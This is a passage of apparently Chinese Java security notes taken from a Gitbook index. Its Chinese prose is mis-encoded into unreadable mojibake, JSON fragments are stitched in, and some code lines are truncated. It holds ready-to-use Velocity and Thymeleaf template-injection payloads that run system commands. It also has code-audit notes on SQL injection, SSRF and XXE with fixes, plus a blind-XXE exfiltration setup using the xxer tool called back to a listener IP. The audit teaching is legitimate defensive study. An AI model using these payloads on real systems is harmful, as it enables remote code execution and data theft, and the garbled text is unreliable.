è¿™é‡Œåˆ©ç”¨è½½è·æ˜¯è¦æŠŠä¸Šé¢çš„Objectæ›¿æ¢æ›¿æ¢æˆå¯ç¼–è¾‘æ¨¡æ¿ä¸­å¯ç”¨çš„çœŸå®çš„Objectååˆ©ç”¨æ‰è¡Œ velocity poc // å‘½ä»¤æ‰§è¡Œ1 #set($e=\"e\") $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"open -a Calculator\") // å‘½ä»¤æ‰§è¡Œ2 #set($x='')## #set($rt = $x.class.forName('java.lang.Runtime'))## #set($chr = $x.class.forName('java.lang.Character'))## #set($str = $x.class.forName('java.lang.String'))## #set($ex=$rt.getRuntime().exec('id'))## $ex.waitFor() #set($out=$ex.getInputStream())## #foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end // å‘½ä»¤æ‰§è¡Œ3 #set ($e=\"exp\") #set ($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd)) #set ($input=$e.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a)) #set($sc = $e.getClass().forName(\"java.util.Scanner\")) #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(\"java.io.InputStream\"))) #set($scan=$constructor.newInstance($input).useDelimiter(\"\\A\")) #if($scan.hasNext()) $scan.next() #end Thymeleaf pocå®è´¨ä¸Šæ˜¯spelè¡¨è¾¾å¼æ³¨å…¥ å‘½ä»¤æ‰§è¡Œ // å‚æ•°ä¼ å‚ __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x // è·¯å¾„ä¼ å‚ __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x Dubbo--20880ç«¯å£ dubboæ˜¯ä¸€ä¸ªåŸºäºSpringçš„RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰æ¡†æ¶ï¼Œèƒ½å¤Ÿå®ç°æœåŠ¡çš„è¿œç¨‹è°ƒç”¨ã€æœåŠ¡çš„æ²»ç† Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:19:31 "},"03.ä»£ç å®¡è®¡/JAVA/Javaä»£å®¡--å¸¸è§æ¼æ´å‡½æ•°.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/Javaä»£å®¡--å¸¸è§æ¼æ´å‡½æ•°.html","title":"Javaä»£ç å®¡è®¡--å¸¸è§æ¼æ´å‡½æ•°","keywords":"","body":"Sqlæ³¨å…¥ Javaä¸­çš„æ•°æ®åº“æ“ä½œ JDBC æ•°æ®åº“è¿æ¥ åŸå§‹ String CLASS_NAME = \"com.mysql.cj.jdbc.Driver\"; //æ­£ç¡®è®¾ç½®æ—¶åŒºï¼Œå¦åˆ™ä¼šæŠ¥é”™ String URL = \"jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&serverTimezone=UTC\"; String USERNAME = \"root\"; String PASSWORD = \"123\"; Class.forName(CLASS_NAME);// æ³¨å†ŒJDBCé©±åŠ¨ç±» Connection con = DriverManager.getConnection(URL, USERNAME, PASSWORD); Datasource ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJava ä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡ TCP è¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡ JDBC æ¥å£æ¥è®¿é—®ï¼Œè€Œ JDBC æ¥å£åˆ™é€šè¿‡ JDBC é©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚ è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚ spring.datasource.url=jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&useUnicode=true&characterEncoding=utf-8&useSSL=true spring.datasource.username=root spring.datasource.password=123 spring.datasource.type=com.alibaba.druid.pool.DruidDataSource spring.datasource.driver-class-name=com.mysql.jdbc.Driver æŸ¥è¯¢å‡½æ•° statement.executeQuery() String sql = \"select * from user where name = '\" + username + \"'\"; ResultSet rs = statement.executeQuery(sql); PreparedStatement PrepareStatementä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ ä¼ å‚'admin' é¢„ç¼–è¯‘ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è‡ªåŠ¨åŠ ä¸Šä¸€å¯¹å•å¼•å·ï¼Œå¹¶å¯¹å‚æ•°å€¼è¿›è¡Œè½¬ä¹‰æ“ä½œ é¢„ç¼–è¯‘ä½¿ç”¨ å•ä¸ªå‚æ•° String sql=\"select * from user where name=?\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(1,username); ResultSet rs = statement.executeQuery(); inè¯­å¥ åœ¨inå½“ä¸­ä½¿ç”¨æ‹¼æ¥è€Œä¸ä½¿ç”¨å ä½ç¬¦åšé¢„ç¼–è¯‘çš„åŸå› æ˜¯å› ä¸ºå¾ˆå¤šæ—¶å€™æ— æ³•ç¡®å®šèŒƒå›´é‡Œå«æœ‰å¤šå°‘ä¸ªå¯¹è±¡ public int gradeDelete(Connection con, String delIds) throws Exception{ String num = \"\"; //å°†å¯¹è±¡åˆ†å‰²å¼€æ¥,æ ¹æ®å®é™…ä¼ å‚æƒ…å†µè¿›è¡Œåˆ†å‰² String[] spl = delIds.split(\".\"); //æ ¹æ®å¯¹è±¡çš„ä¸ªæ•°æ·»åŠ åŒé‡çš„å ä½ç¬¦?,ç”¨æ¥é¢„ç¼–è¯‘ for(int i = 0; i likeè¯­å¥ æ­£ç¡®çš„å†™æ³• String sql = \"select * from users like ?\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(\"txf\",\"%\"+username+\"%\"); ResultSet rs = statement.executeQuery(); æˆ–è€… String sql = \"select * from users like concat('%',?,'%')\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(\"txf\",username); ResultSet rs = statement.executeQuery(); é”™è¯¯çš„å†™æ³• String sql = \"select * from users like %?%\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(1,username); ResultSet rs = statement.executeQuery(); å½“ç„¶å¯¹äºorder byè¿™ç§ä½¿ç”¨äº†é¢„ç¼–è¯‘ä¼šå¯¼è‡´Sqlè¯­å¥å¤±æ•ˆçš„åœ°æ–¹ï¼Œè¿˜æ˜¯éœ€è¦æ‰‹åŠ¨å†™é»‘ç™½åå•çš„è¿‡æ»¤æ‰å¯ä»¥ã€‚ Hibernateæ¡†æ¶ Hibernateæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„å¯¹è±¡å…³ç³»æ˜ å°„æ¡†æ¶ï¼Œå®ƒå¯¹JDBCè¿›è¡Œäº†éå¸¸è½»é‡çº§çš„å¯¹è±¡å°è£…ï¼Œä½¿å¾—Javaç¨‹åºå‘˜å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ä½¿ç”¨å¯¹è±¡ç¼–ç¨‹æ€ç»´æ¥æ“çºµæ•°æ®åº“ã€‚ Hibernateå¯ä»¥ä½¿ç”¨hqlæ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œæ— è®ºæ˜¯å“ªç§æ–¹å¼éƒ½æœ‰å¯èƒ½å¯¼è‡´SQLæ³¨å…¥ SqlæŸ¥è¯¢ HQLè¯­å¥ String hql = \"from People where username = '\" + username + \"' and password = '\" + password + \"'\"; Query query = session.createQuery(hql); List list = query.list(); System.out.println(list); Sqlè¯­å¥ Query query = session.createNativeQuery(\"select * from user where username = '\" + username + \"' and password = '\" + password + \"'\"); é¢„ç¼–è¯‘ä½¿ç”¨ å‘½åå‚æ•°ï¼ˆnamed parameter) Query query = session.createQuery(\"from users name = :name\", User.class); query.setParameter(\"name\", parameter); ä½ç½®å‚æ•°ï¼ˆPositional parameterï¼‰ Query query = session.createQuery(\"from users name = ?\", User.class); query.setParameter(0, parameter); å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed parameter listï¼‰ List names = Arrays.asList(\"111\", \"222\"); Query query = session.createQuery(\"from users where name in (:names)\", User.class); query.setParameter(\"names\", names); ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰ user1.setName(\"khaz\"); Query query = session.createQuery(\"from users where name =:name\", User.class); query.setProperties(user1); Mybatisæ¡†æ¶ MyBatis æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒæ”¯æŒè‡ªå®šä¹‰ SQLã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„ã€‚MyBatis å…é™¤äº†å‡ ä¹æ‰€æœ‰çš„ JDBC ä»£ç ä»¥åŠè®¾ç½®å‚æ•°å’Œè·å–ç»“æœé›†çš„å·¥ä½œã€‚MyBatis å¯ä»¥é€šè¿‡ç®€å•çš„ XML æˆ–æ³¨è§£æ¥é…ç½®å’Œæ˜ å°„åŸå§‹ç±»å‹ã€æ¥å£å’Œ Java POJOï¼ˆPlain Old Java Objectsï¼Œæ™®é€šè€å¼ Java å¯¹è±¡ï¼‰ä¸ºæ•°æ®åº“ä¸­çš„è®°å½•ã€‚ ä½¿ç”¨ åŸºäºæ³¨è§£ dao @Mapper public interface UserMapper { @Select(\"select * from user\") public List findAll(); } è¦ä¹ˆåœ¨æ¯ä¸€ä¸ªdaoä¸ŠåŠ ä¸Š@Mapperï¼Œæˆ–è€…ä¸åŠ ç„¶ååœ¨å¯åŠ¨ç±»åŠ ä¸Š@MapperScan(\"daoæ‰€åœ¨çš„åŒ…\") entity public class User { private int id; private String name; private String pwd; } Controller @RestController @RequestMapping(value = \"/mybatis\") public class SqlDemo { @Autowired private UserMapper userMapper; @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } } åŸºäºXML ä¸»è¦åŒºåˆ«åœ¨äºsqlè¯­å¥ä¸€ä¸ªæ˜¯å†™åœ¨Mapperæ³¨è§£ï¼Œä¸€ä¸ªæ˜¯å†™åœ¨XMLä¸­ mapper select * from user dao @Mapper @Repository public interface UserXmlMapper { public List findAll(); } æ˜ å°„å…³ç³» mybatis: mapper-locations: classpath:mapper/*Mapper.xml # mapperæ˜ å°„æ–‡ä»¶è·¯å¾„ type-aliases-package: com.itheima.springbootmybatis.domain entity public class User { private int id; private String name; private String pwd; } Controller @RestController @RequestMapping(value = \"/mybatis\") public class SqlDemo { @Autowired private UserMapper userMapper; @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } } ä¼ å‚æ–¹å¼ Mybatisä¸‹æœ‰ä¸¤ç§ä¼ å‚æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯${}ä»¥åŠ#{} ${}ä¼ å‚ ä½¿ç”¨${}çš„æ–¹å¼ä¼ å‚ï¼Œmybatisæ˜¯å°†ä¼ å…¥çš„å‚æ•°ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸Š Mapper @Select(\"select * from user where name = '${username}'\") public List queryByName(String username); Controller @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } #{}ä¼ å‚ ä½¿ç”¨#{}ä¼ å‚åˆ™ç›¸å½“äºä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œç›¸å½“äº?å ä½ç¬¦ Mapper @Select(\"select * from user where name = #{username}\") public List queryByName(String username); æ€»ç»“ å¯èƒ½å­˜åœ¨çš„sqlæ³¨å…¥ç‚¹ DAO: å­˜åœ¨æ‹¼æ¥çš„SQLè¯­å¥ String sql=\"select * from user where id=\"+id Hibernateæ¡†æ¶ session.createQuery(\"from Book where title like '%\" + userInput + \"%' and published = true\") Mybatisæ¡†æ¶ Select * from news where title like concat(\"%\"+\"${title}\"+\"%\") Select * from news where id in (${id})ï¼Œ Select * from news where title ='java' order by ${time} asc âš ï¸ æ³¨æ„å¹¶ä¸æ˜¯å…¨éƒ¨çš„å‚æ•°æ‹¼æ¥éƒ½ä¼šäº§ç”Ÿæ¼æ´çš„ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µæ˜¯ä¸å­˜åœ¨SQLæ³¨å…¥çš„ï¼š paramä¸å¯æ§ paramä¸æ˜¯å­—ç¬¦ç±»å‹ï¼Œæ¯”å¦‚è¯´parameterä¸ºintç±»å‹ï¼Œåªèƒ½ä¼ å…¥æ•°å­—ï¼Œå°±æ²¡æ³•äº§ç”ŸSQLæ³¨å…¥ paramåœ¨ä¼ é€’è¿‡ç¨‹ä¸­è¢«è½¬ä¹‰æˆ–è¿‡æ»¤ï¼Œæ¯”å¦‚filterè¿‡æ»¤å™¨ ä¿®å¤ æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘,å¦‚å ä½ç¬¦é—®é¢˜ï¼ŒMybatisæ¡†æ¶ä½¿ç”¨#{} ä¸èƒ½é¢„ç¼–è¯‘çš„åœ°æ–¹å¦‚Order Byï¼Œå¯ä»¥åŠ filteræ¥è¿›è¡Œé»‘åå•è¿‡æ»¤ Spring Booté¡¹ç›®æŒ–æ˜ è§‚å¯Ÿé¡¹ç›®ä½¿ç”¨äº†å“ªä¸€ç§æ–¹æ³•æ¥æ“ä½œæ•°æ®åº“ ä»POM.XMLä¸­å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†Mybatisæ¡†æ¶ æœç´¢ç›¸å…³å…³é”®è¯ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç‚¹ å¦‚Mybatisæ¡†æ¶å°±æœç´¢${ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå› ä¸ºæ˜¯likeæ¨¡ç³ŠæŸ¥è¯¢æ‰€ä»¥ä½¿ç”¨äº†${}æ¥è¿›è¡Œæ‹¼æ¥ é€†å‘è¿½è¸ªæ‹¼æ¥çš„å‚æ•°ä¼ å…¥è¿‡ç¨‹ï¼Œé€†å‘è¿½è¸ªå‚æ•°çš„è·¯å¾„å¤§è‡´ä¸ºMapper -> Dao -> ServiceImpl -> Controller æœç´¢å¾—åˆ°æœ‰ä¸¤å¤„æŸ¥è¯¢ä½¿ç”¨äº†${}æ¥è¿›è¡Œæ‹¼æ¥ é€šè¿‡namespaceå¯ä»¥æ‰¾åˆ°å¯¹åº”çš„Dao åœ¨Daoä¸­æ‰¾åˆ°å¯¹åº”æ–¹æ³•ï¼Œ find usagesè·³è½¬åˆ°å¯¹åº”å®ç° å†æ¬¡è¿½è¸ªè¯¥æ–¹æ³•è°ƒç”¨ï¼Œæ¥åˆ°Crontrollerå±‚ æ‰€å±ç±» æ‰€ä»¥æœ‰å¦‚ä¸‹è¯·æ±‚ /admin/goods/list?page=xx&limit=xx&goodsName= ä½¿ç”¨sqlmapéªŒè¯ å¦ä¸€å¤„ä¹Ÿæ˜¯å¦‚æ­¤åˆ†æ æ€»ç»“ æœ¬æ¬¡è¾ƒä¸ºç®€å•ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤çš„å­˜åœ¨ï¼Œä¸»è¦æ˜¯å­¦ä¹ å¦‚ä½•å¯»æ‰¾ä»¥åŠæ•°æ®çš„æµå‘ã€‚ é‚£ä¹ˆå¯¹äºSQLæ³¨å…¥çš„å®¡è®¡ï¼Œå¦‚Mybatisæ¡†æ¶å…ˆåœ¨Mapperä¸­æœå¯»æ˜¯å¦å­˜åœ¨${}æ‹¼æ¥çš„æƒ…å†µï¼Œå°¤å…¶æ³¨æ„order byã€group byã€likeã€inã€‚æ‰¾åˆ°æ‹¼æ¥åå†é€†å‘è¿½è¸ªå‚æ•°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦å¯æ§ï¼Œæ˜¯å¦æ˜¯å­—ç¬¦ç±»å‹ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨è¿‡æ»¤å™¨è¿‡æ»¤SQLå­—ç¬¦ã€‚ SSRF ç›¸å…³å‡½æ•° å¸¦HTTPå¼€å¤´ï¼Œåªæ”¯æŒHTTPã€HTTPSåè®®çš„ String url = request.getParameter(\"url\"); URL u = new URL(url); // HttpURLConnection HttpURLConnection httpURLConnection = (HttpURLConnection)urlConnection; // OkHttpClient OkHttpClient client = new OkHttpClient(); com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(u).build(); client.newCall(ok_http).execute(); // HttpClients CloseableHttpClient client = HttpClients.createDefault(); HttpGet httpGet = new HttpGet(u); HttpResponse httpResponse = client.execute(httpGet); æ”¯æŒsun.net.www.protocolæ‰€æœ‰åè®®çš„ //openStream InputStream inputStream = u.openStream(); //URLConnection URLConnection urlConnection = u.openConnection(); å…¶ä»– // ImageIOï¼Œå¦‚æœè·å–åˆ°çš„ä¸æ˜¯å›¾ç‰‡ï¼Œä¼šè¿”å›null BufferedImage img = ImageIO.read(u); javaè‡ªèº«å¯¹ssrfçš„é™åˆ¶ æ”¯æŒçš„åè®® JDK1.8å¦‚ä¸‹å›¾ ä½ç‰ˆæœ¬çš„JDK1.7æ˜¯æ”¯æŒgopheråè®®çš„ DNS Rebindingé™åˆ¶ Javaåº”ç”¨çš„é»˜è®¤TTLä¸º10sï¼Œè¿™ä¸ªé»˜è®¤é…ç½®ä¼šå¯¼è‡´DNS Rebindingç»•è¿‡å¤±è´¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒJavaåº”ç”¨ä¸å—DNS Rebindingå½±å“ã€‚ 302è·³è½¬é™åˆ¶ javaé»˜è®¤ä¼šURLé‡å®šå‘ã€‚ è®¿é—®payload http://localhost:8080/download?url=http://joychou.me/302.php æ”¶åˆ°å¼‚å¸¸ï¼š java.net.MalformedURLException: unknown protocol: gopher è·Ÿè¸ªæŠ¥é”™ä»£ç ï¼š private boolean followRedirect() throws IOException { if(!this.getInstanceFollowRedirects()) { return false; } else { final int var1 = this.getResponseCode(); if(var1 >= 300 && var1 ä»ä¸Šé¢çš„followRedirectæ–¹æ³•å¯ä»¥çœ‹åˆ°ï¼š å®é™…è·³è½¬çš„urlä¹Ÿåœ¨é™åˆ¶çš„åè®®å†… ä¼ å…¥çš„urlåè®®å¿…é¡»å’Œé‡å®šå‘çš„urlåè®®ä¸€è‡´ Javaä¸­çš„fileåè®®Trick Javaçš„fileåè®®æœ‰ä¸€ä¸ªtrickï¼Œå¦‚æœfileåè®®çš„è·¯å¾„æ˜¯ç›®å½•å°±ä¼šåˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ file:///è·Ÿfile:/æ˜¯ä¸€æ ·çš„ ä¿®å¤æ–¹æ¡ˆ è§£æç›®æ ‡URL è·å–schemeã€hostï¼ˆæ¨èä½¿ç”¨ç³»ç»Ÿå†…ç½®å‡½æ•°å®Œæˆ,é¿å…è‡ªå·±ä½¿ç”¨æ­£åˆ™æå–ï¼‰ æ ¡éªŒscheme æ£€æŸ¥ scheme æ˜¯å¦ä¸ºåˆæ³• (å¦‚éç‰¹æ®Šéœ€æ±‚è¯·åªå…è®¸ http å’Œ https) è·å–è§£æIP è§£æ host è·å– dns è§£æåçš„ IP åœ°å€ æ£€æµ‹IPæ˜¯å¦åˆæ³• æ£€æŸ¥è§£æåçš„IPåœ°å€æ˜¯å¦ä¸ºå¤–ç½‘åœ°å€æˆ–è€…åˆæ³•IPï¼ˆè½¬æ¢ä¸ºç»Ÿä¸€æ ¼å¼çš„IPæ¥åˆ¤æ–­ï¼‰ è¯·æ±‚URL å…ˆæ£€éªŒURLå¯¹åº”çš„IPæ˜¯å¦åˆæ³•ï¼Œå†å‘åŒ… å¦‚æœæœ‰é‡å®šå‘ï¼Œå›åˆ°æ­¥éª¤1ï¼Œå¹¶ä¸”è®¾ç½®æœ€å¤§é‡å®šå‘æ¬¡æ•° å…³äºDNS Rebindingçš„ä¿®å¤ å¦‚æœè¯·æ±‚çš„åŸŸåæ˜¯åœ¨ä¸€å®šèŒƒå›´å†…çš„ï¼Œæ¯”å¦‚è¯´å­˜å‚¨æ¡¶é™æ€æ–‡ä»¶ï¼Œå¯ä»¥è®¾å®šåŸŸåç™½åå• è¯·æ±‚urlæ—¶ï¼Œä¸ä½¿ç”¨åŸŸåè®¿é—®ï¼Œè€Œæ˜¯å…ˆè·å¾—å¯¹åº”çš„IPï¼Œå¯¹IPè¿›è¡Œåˆ¤æ–­åï¼Œå†è¯·æ±‚è¯¥IP XXE ç›¸å…³å‡½æ•° xmlReader æ¼æ´ä»£ç  XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml ä¿®å¤ XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml SAXBuilder æ¼æ´ä»£ç  SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe ä¿®å¤ SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); SAXReader æ¼æ´ä»£ç  SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe ä¿®å¤ SAXReader reader = new SAXReader(); reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); reader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); reader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); SAXParser æ¼æ´ä»£ç  SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml ä¿®å¤ SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml Digester æ¼æ´ä»£ç  Digester digester = new Digester(); digester.parse(new StringReader(body)); // parse xml ä¿®å¤ Digester digester = new Digester(); digester.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); digester.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); digester.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); digester.parse(new StringReader(body)); // parse xml DocumentBuilder--æ™®é€š æ¼æ´ä»£ç  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); InputSource is = new InputSource(request.getInputStream()); Document document = db.parse(is); // parse xml ä¿®å¤ DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); db.parse(is); // parse xml DocumentBuilder--Xinclude æ¼æ´ä»£ç  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // æ”¯æŒXInclude dbf.setNamespaceAware(true); // æ”¯æŒXInclude DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml ä¿®å¤ DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // æ”¯æŒXInclude dbf.setNamespaceAware(true); // æ”¯æŒXInclude dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml XMLReader æ¼æ´ä»£ç  SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); ä¿®å¤ SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); xmlReader.parse(new InputSource(new StringReader(body))); DocumentHelper æ¼æ´ä»£ç  DocumentHelper.parseText(body); ä¿®å¤ å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITY XMLBeam Spring Data Commons 1.13è‡³1.13.11ä»¥åŠ2.0è‡³2.0.6çš„ç‰ˆæœ¬åœ¨ä¸XMLBeam1.4.14æˆ–æ›´æ—©çš„ç‰ˆæœ¬è¿›è¡Œç»“åˆä½¿ç”¨æ—¶ï¼ŒXMLBeamä¸ä¼šé™åˆ¶XMLå¤–éƒ¨å®ä½“åº”ç”¨ CVE-2018-1259å¤ç° æ¼æ´ä»£ç  @ProjectedPayload public interface UserPayload { @XBRead(\"//userName\") String getUserName(); } return ResponseEntity.ok(String.format(\"hello, %s!\", user.getUserName())) ä¿®å¤ å‡çº§ç‰ˆæœ¬ ç›¸å…³åè®® file://å’Œnetdoc:// è¯»å–æ–‡ä»¶ file:// netdoc:// åˆ—ç›®å½• file:// netdoc:// ftp://--æ•°æ®å¤–å¸¦ å·¥å…·ï¼š TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab. (github.com) python2 .\\xxer.py -p 1234 -H 192.168.23.108 -pæ˜¯æŒ‡å®šhttp_serverçš„ç«¯å£ï¼Œftp_serveré»˜è®¤ç«¯å£ä¸º2121 å¯åŠ¨åç”Ÿæˆçš„æ¶æ„DTDä¸º \"> å‘é€payload æŸ¥çœ‹ftpæ—¥å¿—ï¼Œå¾—åˆ°å¤–å¸¦æ•°æ® æ³¨æ„ç‚¹ï¼š jdkç‰ˆæœ¬ å°äº 7u141 å’Œ å°äº 8u162 æ‰å¯ä»¥è¯»å–æ•´ä¸ªæ–‡ä»¶ æœ‰ç‰¹å®šå­—ç¬¦æ—¶æ— æ³•è¯»å– æˆ‘è¿™é‡Œæ˜¯JDK8u371ï¼Œæ–‡ä»¶ä¸­å«æœ‰' & % / #æ—¶æ— æ³•è¯»å– åˆ«äººçš„æµ‹è¯•ç»“æœ jar:// ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ | K0rz3n's Blog ååºåˆ—åŒ– jdbcååºåˆ—åŒ– JDBC(Java Database Connectivity)æ˜¯Javaæä¾›å¯¹æ•°æ®åº“è¿›è¡Œè¿æ¥ã€æ“ä½œçš„æ ‡å‡†APIã€‚Javaè‡ªèº«å¹¶ä¸ä¼šå»å®ç°å¯¹æ•°æ®åº“çš„è¿æ¥ã€æŸ¥è¯¢ã€æ›´æ–°ç­‰æ“ä½œè€Œæ˜¯é€šè¿‡æŠ½è±¡å‡ºæ•°æ®åº“æ“ä½œçš„APIæ¥å£(JDBC)ï¼Œä¸åŒçš„æ•°æ®åº“æä¾›å•†å¿…é¡»å®ç°JDBCå®šä¹‰çš„æ¥å£ä»è€Œä¹Ÿå°±å®ç°äº†å¯¹æ•°æ®åº“çš„ä¸€ç³»åˆ—æ“ä½œã€‚ 